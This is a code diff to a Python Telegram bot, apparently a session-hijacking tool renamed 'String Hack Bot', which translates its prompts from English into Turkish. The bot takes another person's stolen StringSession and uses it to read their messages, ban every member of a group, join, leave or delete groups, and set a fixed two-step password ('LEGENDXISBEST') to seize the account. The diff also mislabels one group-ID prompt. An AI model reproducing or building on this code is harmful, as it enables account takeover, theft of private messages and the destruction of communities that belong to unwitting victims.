@@ -252,64 +252,64 @@ async def start(event):
         pass
       else:
         return await event.respond("Bu StringSession belki sonlandırılmıştır")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VERİN")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("Tüm üyeler yasaklandı, String Hack Bot'u kullandığınız için teşekkürler")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nString Hack botu kullandığın için teşekkür ederim")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VERİN")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Kanala/Grupa katıldım String Hack Bot'u Kullandığınız İçin Teşekkürler")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
+      await x.send_message("STRING OTURUM VERİN")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Kanaldan/Gruptan Ayrıldım String Hack Bot'u Kullandığınız İçin Teşekkürler")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VERİN")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Kanalı/Grupu sildim String Hack Bot'u Kullandığınız İçin Teşekkürler")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
       i = await user2fa(strses.text)
       if i:
         await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
